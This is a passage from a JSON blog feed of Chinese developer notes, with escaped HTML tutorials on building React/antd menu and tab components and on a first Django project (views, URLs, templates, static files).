string\">'dark'</span> <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> AppMenu<span class=\"token punctuation\">;</span>\n</code></pre></div><p>修改src\\layout\\AppLayout.tsx文件，引入AppMenu组件：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> AppMenu <span class=\"token keyword\">from</span> <span class=\"token string\">\"./AppMenu\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//引入菜单组件</span>\n\n                    <span class=\"token operator\">&lt;</span>Sider width<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">190</span><span class=\"token punctuation\">}</span> style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>overflow<span class=\"token operator\">:</span> <span class=\"token string\">\"auto\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                        <span class=\"token operator\">&lt;</span>span style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>color<span class=\"token operator\">:</span> <span class=\"token string\">\"white\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>菜单区<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n                        <span class=\"token operator\">&lt;</span>AppMenu <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 在左侧边栏应用菜单组件 */</span><span class=\"token punctuation\">}</span>\n                    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Sider<span class=\"token operator\">&gt;</span>\n</code></pre></div><h3>创建多页签组件</h3>\n<p>创建src\\layout\\AppTabs.tsx文件，编辑文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> useRef<span class=\"token punctuation\">,</span> useState <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Tabs <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">TargetKey</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span>MouseEvent <span class=\"token operator\">|</span> React<span class=\"token punctuation\">.</span>KeyboardEvent <span class=\"token operator\">|</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> initialItems <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span> label<span class=\"token operator\">:</span> <span class=\"token string\">'页签一'</span><span class=\"token punctuation\">,</span> children<span class=\"token operator\">:</span> <span class=\"token string\">'这是页签一的内容'</span><span class=\"token punctuation\">,</span> key<span class=\"token operator\">:</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> closable<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span> label<span class=\"token operator\">:</span> <span class=\"token string\">'页签二'</span><span class=\"token punctuation\">,</span> children<span class=\"token operator\">:</span> <span class=\"token string\">'页签只能是文本内容吗？'</span><span class=\"token punctuation\">,</span> key<span class=\"token operator\">:</span> <span class=\"token string\">'2'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span> label<span class=\"token operator\">:</span> <span class=\"token string\">'页签三'</span><span class=\"token punctuation\">,</span> children<span class=\"token operator\">:</span> <span class=\"token string\">'还需要改进啊'</span><span class=\"token punctuation\">,</span> key<span class=\"token operator\">:</span> <span class=\"token string\">'3'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">AppTabs</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>activeKey<span class=\"token punctuation\">,</span> setActiveKey<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">useState</span><span class=\"token punctuation\">(</span>initialItems<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>items<span class=\"token punctuation\">,</span> setItems<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">useState</span><span class=\"token punctuation\">(</span>initialItems<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> newTabIndex <span class=\"token operator\">=</span> <span class=\"token function\">useRef</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">onChange</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>newActiveKey<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">setActiveKey</span><span class=\"token punctuation\">(</span>newActiveKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">const</span> newActiveKey <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">newTab</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>newTabIndex<span class=\"token punctuation\">.</span>current<span class=\"token operator\">++</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> newPanes <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>items<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        newPanes<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> label<span class=\"token operator\">:</span> <span class=\"token string\">'New Tab'</span><span class=\"token punctuation\">,</span> children<span class=\"token operator\">:</span> <span class=\"token string\">'Content of new Tab'</span><span class=\"token punctuation\">,</span> key<span class=\"token operator\">:</span> newActiveKey <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">setItems</span><span class=\"token punctuation\">(</span>newPanes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">setActiveKey</span><span class=\"token punctuation\">(</span>newActiveKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>targetKey<span class=\"token operator\">:</span> TargetKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">let</span> newActiveKey <span class=\"token operator\">=</span> activeKey<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> lastIndex <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        items<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>key <span class=\"token operator\">===</span> targetKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                lastIndex <span class=\"token operator\">=</span> i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> newPanes <span class=\"token operator\">=</span> items<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> item<span class=\"token punctuation\">.</span>key <span class=\"token operator\">!==</span> targetKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>newPanes<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&amp;&amp;</span> newActiveKey <span class=\"token operator\">===</span> targetKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lastIndex <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                newActiveKey <span class=\"token operator\">=</span> newPanes<span class=\"token punctuation\">[</span>lastIndex<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                newActiveKey <span class=\"token operator\">=</span> newPanes<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">setItems</span><span class=\"token punctuation\">(</span>newPanes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">setActiveKey</span><span class=\"token punctuation\">(</span>newActiveKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">onEdit</span><span class=\"token punctuation\">(</span>targetKey<span class=\"token operator\">:</span> React<span class=\"token punctuation\">.</span>MouseEvent <span class=\"token operator\">|</span> React<span class=\"token punctuation\">.</span>KeyboardEvent <span class=\"token operator\">|</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> action<span class=\"token operator\">:</span> <span class=\"token string\">'add'</span> <span class=\"token operator\">|</span> <span class=\"token string\">'remove'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>action <span class=\"token operator\">===</span> <span class=\"token string\">'add'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>targetKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token operator\">&lt;</span>Tabs\n            type<span class=\"token operator\">=</span><span class=\"token string\">\"editable-card\"</span>\n            onChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>onChange<span class=\"token punctuation\">}</span>\n            activeKey<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>activeKey<span class=\"token punctuation\">}</span>\n            onEdit<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>onEdit<span class=\"token punctuation\">}</span>\n            items<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>items<span class=\"token punctuation\">}</span>\n            hideAdd<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">}</span>\n        <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> AppTabs<span class=\"token punctuation\">;</span>\n</code></pre></div><p>然后修改src\\layout\\AppLayout.tsx文件，引入AppTabs组件，并在<code>&lt;Content&gt;</code> 标签中使用这个组件</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> AppTabs <span class=\"token keyword\">from</span> <span class=\"token string\">\"./AppTabs\"</span><span class=\"token punctuation\">;</span>\n\n                    <span class=\"token operator\">&lt;</span>Content<span class=\"token operator\">&gt;</span>\n                        <span class=\"token operator\">&lt;</span>span style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>color<span class=\"token operator\">:</span> <span class=\"token string\">\"white\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>页签区<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">&gt;</span>\n                        <span class=\"token operator\">&lt;</span>AppTabs <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 在右侧内容区应用页签组件 */</span><span class=\"token punctuation\">}</span>\n                    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Content<span class=\"token operator\">&gt;</span>\n</code></pre></div><figure><figcaption>image.png</figcaption></figure>\n<h2>添加菜单点击功能</h2>\n",
      "date_published": "2024-08-01T13:47:02.000Z",
      "date_modified": "2024-08-01T14:56:41.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "Go语言精进",
      "url": "https://echo0d.github.io/DailyNotes/develop/Go/ImprovingGo/",
      "id": "https://echo0d.github.io/DailyNotes/develop/Go/ImprovingGo/",
      "summary": "Go语言精进",
      "content_html": "\n",
      "date_published": "2024-08-01T13:47:02.000Z",
      "date_modified": "2024-08-01T13:47:02.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "Django第一次使用记录",
      "url": "https://echo0d.github.io/DailyNotes/develop/Python/test_django.html",
      "id": "https://echo0d.github.io/DailyNotes/develop/Python/test_django.html",
      "summary": "Django第一次使用记录\n创建项目\n项目建立后目录结构\nimage-20240205153742410image-20240205153742410\n创建应用程序\nimage-20240205155116269image-20240205155116269\n静态HTML页面\n1、业务逻辑代码\n业务逻辑代码按照Django的约定一般要写在views.p...",
      "content_html": "\n<h2>创建项目</h2>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>pip install django\nmkdir test_django\ncd test_django\ndjango-admin.exe startproject myproject (# python的Scripts/文件夹路径加入环境变量Path里才能直接写执行)\n\n</code></pre></div><p>项目建立后目录结构</p>\n<figure><figcaption>image-20240205153742410</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>manage.py  # 简单的命令文件封装文件，可以通过这个文件生成应用程序\nmyproject/ # 一个目录，与项目名称一样，称为项目目录\n__init.py__ # 一个空文件，用来告诉Python这是myproject目录的一个模块\nsettings.py # 项目配置文件，包含一些初始化设置\nurls.py # # 存放URL表达式的文件，这里定义的每一个URL都对应一个视图函数，这个文件称为路由文件\nwsgi.py # 服务器程序和应用程序的一个协议接口，规定了使用的接口和功能，这个文件不需修改， Django已为项目配置好\n</code></pre></div><h2>创建应用程序</h2>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>cd myproject\npython manage.py startapp myapp\n</code></pre></div><figure><figcaption>image-20240205155116269</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>myapp/\n__init__.pyadmin.py　　# 配置管理后台，写少量代码就可以启用Django Admin管理后台\napps.py：　　# 存放当前应用程序的配置\nmodels.py　 # 存放数据库相关的内容\ntests.py　　# 可在这个文件写测试代码以对当前应用程序进行测试\nviews.py　　# 存放业务请求功能的代码\nmigrations/ # 这个文件夹中的文件保存该应用程序的数据库表与变化的相关内容\n</code></pre></div><h2>静态HTML页面</h2>\n<p>1、业务逻辑代码</p>\n<p>业务逻辑代码按照Django的约定一般要写在views.py文件中，换句话说就是要在views.py文件中生成一个视图函数并在其中编写代码。</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>shortcuts <span class=\"token keyword\">import</span> HttpResponse\n<span class=\"token comment\"># Create your views here.</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">indec</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> HttpResponse<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;h1&gt;hrllo world&lt;/h1&gt;'</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>2、建立URL与视图函数的对应关系</p>\n<p>URL与视图函数的对应关系要放在<code>urls.py</code>文件中，对应关系以URL配置项形式放在文件中的一个列表变量中。</p>\n<p>第二个参数<code>views.index</code>指的是<code>views.py</code>文件中的函数。</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>contrib <span class=\"token keyword\">import</span> admin\n<span class=\"token keyword\">from</span> django<span class=\"token punctuation\">.</span>urls <span class=\"token keyword\">import</span> path\n<span class=\"token keyword\">from</span> myapp <span class=\"token keyword\">import</span> views\n\nurlpatterns <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    path<span class=\"token punctuation\">(</span><span class=\"token string\">'admin/'</span><span class=\"token punctuation\">,</span> admin<span class=\"token punctuation\">.</span>site<span class=\"token punctuation\">.</span>urls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    path<span class=\"token punctuation\">(</span><span class=\"token string\">'index/'</span><span class=\"token punctuation\">,</span>views<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">]</span>\n</code></pre></div><p>3、启动程序</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>python manage.py runserver\n</code></pre></div><p>访问http://127.0.0.1:8000/index/</p>\n<figure><figcaption>image-20240205160656335</figcaption></figure>\n<h2>动态加载HTML页面</h2>\n<p>新建<code>templates</code>文件夹，在里面新建test.html文件</p>\n<figure><figcaption>image-20240205164508613</figcaption></figure>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>测试模板<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">align</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>center<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">&gt;</span></span>{{ hi }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>{{ test }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>然后在settings.py中指定templates文件夹</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code>TEMPLATES <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">'BACKEND'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'django.template.backends.django.DjangoTemplates'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'DIRS'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>BASE_DIR<span class=\"token operator\">/</span><span class=\"token string\">'templates'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n</code></pre></div><p>在views.py中定义</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code><span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    hi<span class=\"token operator\">=</span><span class=\"token string\">'你好，世界是美好的'</span>\n    test<span class=\"token operator\">=</span><span class=\"token string\">'这是一个测试页，动态页面正常显示，测试成功！'</span>\n    <span class=\"token keyword\">return</span> render<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span><span class=\"token string\">'test.html'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">{</span><span class=\"token string\">'hi'</span><span class=\"token punctuation\">:</span>hi<span class=\"token punctuation\">,</span><span class=\"token string\">'test'</span><span class=\"token punctuation\">:</span>test<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n</code></pre></div><p>urls.py中添加test的路径</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code>urlpatterns <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    path<span class=\"token punctuation\">(</span><span class=\"token string\">'admin/'</span><span class=\"token punctuation\">,</span> admin<span class=\"token punctuation\">.</span>site<span class=\"token punctuation\">.</span>urls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    path<span class=\"token punctuation\">(</span><span class=\"token string\">'index/'</span><span class=\"token punctuation\">,</span>views<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    path<span class=\"token punctuation\">(</span><span class=\"token string\">'test/'</span><span class=\"token punctuation\">,</span> views<span class=\"token punctuation\">.</span>test<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">]</span>\n\n</code></pre></div><p>效果</p>\n<figure><figcaption>image-20240205164941878</figcaption></figure>\n<h2>配置静态文件</h2>\n<p>要让Django找到这些文件必须进行设置，首先在<code>setttings.py</code>文件的<code>INSTALLED_APPS</code>代码块中要有<code>django.contrib.staticfiles</code>这一行</p>\n<p>然后在<code>setttings.py</code>文件中增加以下代码。</p>\n<div class=\"language-python\" data-ext=\"py\" data-title=\"py\"><pre class=\"language-python\"><code>STATIC_URL <span class=\"token operator\">=</span> <span class=\"token string\">'/static/'</span>\nSTATICFILES_DIRS <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>BASE_DIR<span class=\"token punctuation\">,</span> <span class=\"token string\">'static'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">]</span>\n</code></pre></div><p>需要在项目根目录下新建文件夹<code>static</code>，将网页要引用的静态文件或相关文件夹保存在这里。</p>\n<p>然后在<code>templates</code>文件夹中添加<code>login.html</code></p>\n<div class=\"language-html\" data-ext=\"html\" data-title=\"html\"><pre class=\"language-html\"><code>{% load static %}\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n    \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>登录页面<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{% static 'bootstrap/css/bootstrap.min.css' %}<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{% static 'sigin.css' %}<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{% static 'fontawesome/css/font-awesome.min.css' %}<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{% static 'jquery-3.7.1.js' %}<span class=\"token punctuation\">\"</span></span><span class=\"token 